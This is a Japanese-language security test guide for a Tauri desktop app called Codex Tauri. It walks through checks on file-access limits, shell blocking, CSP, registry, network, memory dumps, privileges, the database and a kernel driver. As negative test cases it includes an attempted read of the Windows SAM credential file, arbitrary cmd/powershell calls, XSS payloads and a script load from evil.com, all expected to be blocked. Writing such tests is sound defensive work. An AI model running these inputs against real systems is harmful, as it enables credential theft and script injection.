# Codex Tauri - セキュリティテストガイド

実機でのセキュリティ検証手順

---

## 🔒 セキュリティテスト項目

### 1. ファイルアクセス制限テスト

#### テスト目的
Tauri allowlistによるファイルアクセスが適切に制限されているか確認

#### テスト手順

**Step 1: 許可されたパスへのアクセス（成功すべき）**

Frontend Console（開発者ツール）で実行:
```javascript
// 許可: $APPDATA/codex
await invoke('test_file_access', { 
  path: 'C:\\Users\\<username>\\AppData\\Roaming\\codex\\test.txt' 
})
// → 成功すべき

// 許可: ワークスペース
await invoke('test_file_access', { 
  path: 'C:\\Users\\<username>\\Projects\\myproject\\test.txt' 
})
// → 成功すべき
```

**Step 2: 禁止されたパスへのアクセス（失敗すべき）**

```javascript
// 禁止: システムディレクトリ
await invoke('test_file_access', { 
  path: 'C:\\Windows\\System32\\config\\SAM' 
})
// → エラーになるべき

// 禁止: 他のユーザーディレクトリ
await invoke('test_file_access', { 
  path: 'C:\\Users\\OtherUser\\Documents\\secret.txt' 
})
// → エラーになるべき

// 禁止: ルートディレクトリ
await invoke('test_file_access', { 
  path: 'C:\\' 
})
// → エラーになるべき
```

**期待結果**: 許可されたパス以外は全てエラー

---

### 2. Shell実行制限テスト

#### テスト目的
Shell実行が完全に禁止されているか確認

#### テスト手順

Frontend Consoleで実行:
```javascript
// 禁止: 任意のコマンド実行
await invoke('shell', { cmd: 'cmd.exe /c dir' })
// → エラーになるべき

await invoke('shell', { cmd: 'powershell.exe -Command Get-Process' })
// → エラーになるべき

// 禁止: sidecar実行
await invoke('sidecar', { program: 'malicious.exe' })
// → エラーになるべき
```

**期待結果**: 全てエラー（Shell実行は完全禁止）

---

### 3. IPC通信セキュリティテスト

#### テスト目的
IPC通信が外部から傍受・改ざんされないか確認

#### テスト手順

**Step 1: Process Monitor起動**
```powershell
# Sysinternals Process Monitorダウンロード
# https://docs.microsoft.com/en-us/sysinternals/downloads/procmon

# フィルター設定
# Process Name: codex-tauri.exe
# Operation: IPC Send/IPC Receive
```

**Step 2: Tauri起動してIPC監視**
```powershell
cd codex-tauri
npm run tauri:dev
```

Frontend Console:
```javascript
// IPC通信テスト
await invoke('get_status')
await invoke('get_recent_changes', { limit: 10 })
```

**Step 3: Process Monitorで確認**
- IPC通信がローカルプロセス間のみか確認
- ネットワーク経由の通信がないか確認
- 暗号化されていない平文データがないか確認

**期待結果**: 
- ローカルIPCのみ
- 外部ネットワーク通信なし
- 機密情報の平文送信なし

---

### 4. XSS/Code Injection対策テスト

#### テスト目的
CSP (Content Security Policy) が正しく機能しているか確認

#### テスト手順

Frontend Console:
```javascript
// XSS攻撃シミュレーション
document.body.innerHTML += '<script>alert("XSS")</script>'
// → 実行されないべき（CSPがブロック）

// Inline script実行試行
eval('alert("Eval Attack")')
// → エラーになるべき

// 外部スクリプト読み込み試行
const script = document.createElement('script')
script.src = 'https://evil.com/malicious.js'
document.body.appendChild(script)
// → ブロックされるべき
```

**期待結果**: 全てCSPによりブロック

---

### 5. レジストリアクセス制限テスト

#### テスト目的
レジストリ書き込みがHKCU（現在ユーザー）のみに制限されているか確認

#### テスト手順

**Step 1: Registry Monitorで監視**
```powershell
# Process Monitor起動
# フィルター: Operation = RegSetValue
# Process Name = codex-tauri.exe
```

**Step 2: 自動起動ON/OFF**

Settings画面で「自動起動」をON/OFFして、Process Monitorで確認

**期待結果**:
- ✅ `HKEY_CURRENT_USER\...\Run` への書き込みのみ
- ❌ `HKEY_LOCAL_MACHINE` への書き込みなし
- ❌ 他のユーザーのHKEYへのアクセスなし

---

### 6. ネットワーク通信監視テスト

#### テスト目的
意図しない外部通信がないか確認

#### テスト手順

**Step 1: Wireshark起動**
```powershell
# Wiresharkダウンロード & インストール
# https://www.wireshark.org/

# フィルター設定
# ip.addr != 127.0.0.1 && tcp
```

**Step 2: Codex Tauri起動**
```powershell
cd codex-tauri
npm run tauri build
.\src-tauri\target\release\codex-tauri.exe
```

**Step 3: 各機能を使用**
- ファイル監視開始
- Blueprint作成
- Settings変更

**Step 4: Wiresharkで確認**

**期待結果**:
- ✅ ローカルホスト通信のみ（127.0.0.1）
- ❌ 外部サーバーへの通信なし（Codex CLI呼び出しを除く）
- ❌ 不明なIPアドレスへの接続なし

---

### 7. メモリダンプ解析テスト

#### テスト目的
メモリ内に機密情報が平文で保存されていないか確認

#### テスト手順

**Step 1: Process Explorerで監視**
```powershell
# Sysinternals Process Explorerダウンロード
# https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
```

**Step 2: メモリダンプ取得**
```powershell
# codex-tauri.exeプロセスを右クリック
# → "Create Dump" → "Create Mini Dump"
```

**Step 3: メモリダンプ解析**
```powershell
# Stringsコマンドで平文文字列抽出
strings codex-tauri.dmp | grep -i "password\|token\|secret\|api_key"
```

**期待結果**:
- ❌ パスワードの平文保存なし
- ❌ APIキーの平文保存なし
- ❌ 機密情報の暗号化されていない保存なし

---

### 8. Privilege Escalation対策テスト

#### テスト目的
通常ユーザー権限でのみ動作し、権限昇格がないか確認

#### テスト手順

**Step 1: 通常ユーザーで実行**
```powershell
# 管理者権限なしで実行
cd codex-tauri
npm run tauri:dev
```

**期待結果**: 正常に動作する

**Step 2: 管理者権限要求確認**
```powershell
# タスクマネージャーで確認
# codex-tauri.exe → 右クリック → Properties
# Compatibility → "Run as administrator" がOFFか確認
```

**期待結果**: 管理者権限不要で動作

**Step 3: UAC Prompt確認**

全機能を使用して、UAC（ユーザーアカウント制御）プロンプトが出ないか確認

**期待結果**: UACプロンプトが出ない（通常権限のみで動作）

---

### 9. SQLiteデータベースセキュリティテスト

#### テスト目的
DBファイルが適切に保護されているか確認

#### テスト手順

**Step 1: DB場所確認**
```powershell
# DB場所
%APPDATA%\codex\codex.db
```

**Step 2: ファイル権限確認**
```powershell
icacls "%APPDATA%\codex\codex.db"
```

**期待結果**:
- ✅ 現在ユーザーのみ読み書き可能
- ❌ 他のユーザーからアクセス不可
- ❌ Everyone権限なし

**Step 3: DB内容確認**
```powershell
# SQLite CLIで確認
sqlite3 "%APPDATA%\codex\codex.db"
.schema
SELECT * FROM file_changes LIMIT 5;
```

**期待結果**:
- ファイルパスは相対パスで保存
- 機密情報は暗号化されている
- 平文パスワード等なし

---

### 10. カーネルドライバーセキュリティテスト（Phase 8）

#### テスト目的
カーネルドライバーが安全に動作するか確認

#### テスト手順

**Step 1: VM環境でテスト（必須）**
```powershell
# VMware/Hyper-V/VirtualBoxで隔離環境作成
# スナップショット作成（ロールバック用）
```

**Step 2: テストモード有効化**
```powershell
bcdedit /set testsigning on
# 再起動
```

**Step 3: ドライバーインストール**
```powershell
cd kernel-extensions\windows\ai_driver
pnputil /add-driver ai_driver.inf /install
sc start AiDriver
```

**Step 4: カーネルパニックテスト**
```powershell
# 異常なIOCTL送信テスト
# (専用テストツール必要)
```

**期待結果**:
- ✅ 正常なIOCTLのみ処理
- ✅ 異常な入力でカーネルパニックしない
- ✅ エラーハンドリングが適切

**Step 5: Event Log確認**
```powershell
# イベントビューアー起動
eventvwr.msc

# Windows Logs → System → Filter Current Log
# Source: ai_driver
```

**期待結果**: エラーやWarningがないこと

---

## 🛡️ セキュリティチェックリスト

実機テスト前に確認:

### Tauri設定
- [ ] `tauri.conf.json`でallowlist設定済み
- [ ] CSP設定が厳格（`default-src 'self'`）
- [ ] shell実行が無効
- [ ] ファイルアクセススコープが制限済み

### コード
- [ ] ユーザー入力の検証実装
- [ ] SQL Injection対策（Prepared Statement使用）
- [ ] XSS対策（入力のエスケープ）
- [ ] CSRF対策（ローカルアプリなのでN/A）

### 権限
- [ ] 通常ユーザー権限で動作
- [ ] レジストリ書き込みはHKCUのみ
- [ ] ファイルアクセスはユーザーディレクトリのみ

### 通信
- [ ] 外部通信は必要最小限
- [ ] HTTPS使用（外部API呼び出し時）
- [ ] 機密情報の暗号化

---

## 🚨 脆弱性が見つかった場合

### 対応手順

1. **重大度評価**
   - Critical: 即時修正
   - High: 24時間以内
   - Medium: 1週間以内
   - Low: 次回リリース

2. **修正実装**
   - 脆弱性の原因特定
   - パッチ作成
   - テスト

3. **再テスト**
   - 全セキュリティテスト再実行
   - 回帰テスト

4. **ドキュメント更新**
   - CHANGELOG更新
   - セキュリティアドバイザリ発行

---

## 📊 テスト結果記録

### テンプレート

```markdown
# セキュリティテスト結果

**日時**: 2025-11-03
**テスター**: [名前]
**環境**: Windows 11 Pro 23H2

## テスト結果

| 項目 | 結果 | 備考 |
|------|------|------|
| ファイルアクセス制限 | ✅ Pass | |
| Shell実行制限 | ✅ Pass | |
| IPC通信セキュリティ | ✅ Pass | |
| XSS対策 | ✅ Pass | |
| レジストリアクセス | ✅ Pass | |
| ネットワーク通信 | ✅ Pass | |
| メモリダンプ解析 | ✅ Pass | |
| 権限昇格対策 | ✅ Pass | |
| SQLiteセキュリティ | ✅ Pass | |
| カーネルドライバー | 🔨 未実装 | |

## 発見された問題

なし

## 推奨事項

なし
```

---

## 🔧 セキュリティツール

### 推奨ツール

1. **Process Monitor** (無料)
   - https://docs.microsoft.com/en-us/sysinternals/downloads/procmon
   - ファイル/レジストリアクセス監視

2. **Wireshark** (無料)
   - https://www.wireshark.org/
   - ネットワーク通信監視

3. **Process Explorer** (無料)
   - https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer
   - プロセス詳細情報

4. **Dependency Walker** (無料)
   - https://www.dependencywalker.com/
   - DLL依存関係確認

5. **IDA Free** (無料)
   - https://hex-rays.com/ida-free/
   - バイナリ解析（高度）

---

## 📚 参考資料

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Tauri Security Documentation](https://tauri.app/v1/guides/security)
- [Windows Security Guidelines](https://docs.microsoft.com/en-us/windows/security/)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)

---

**作成日**: 2025-11-03
**バージョン**: 1.0.0
**ステータス**: Draft

